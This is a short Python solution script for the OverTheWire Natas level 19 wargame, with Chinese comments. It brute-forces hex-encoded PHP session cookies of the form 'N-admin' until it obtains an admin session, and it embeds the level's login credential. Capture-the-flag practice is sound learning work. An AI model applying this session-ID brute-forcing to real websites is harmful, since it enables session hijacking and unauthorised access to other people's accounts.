import requests
import binascii

url = 'http://natas19.natas.labs.overthewire.org/index.php'
username = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
#headers = {'Cookie': 'PHPSESSID=3134352d61646d696e'}

for i in range(640):
    sessid = str(i) + '-admin'
    #循环生成sessionID。
    sessidencode = str(binascii.b2a_hex(sessid.encode('utf-8')))[2:-1]
    #将sessionID转换为16进制。str()输出内容b'hex',只需要中间的hex值，[2:-1]用于去掉b'',表示取第三位开始至倒数第二位。
    req = requests.post(url=url,
                        auth=(username, password),
                        data={'username': 'admin', "password": '1'},
                        headers={'Cookie': 'PHPSESSID=' + sessidencode})
    print(i)
    #显示进度
    if 'You are an admin' in req.text:
        print(req.text)
        break
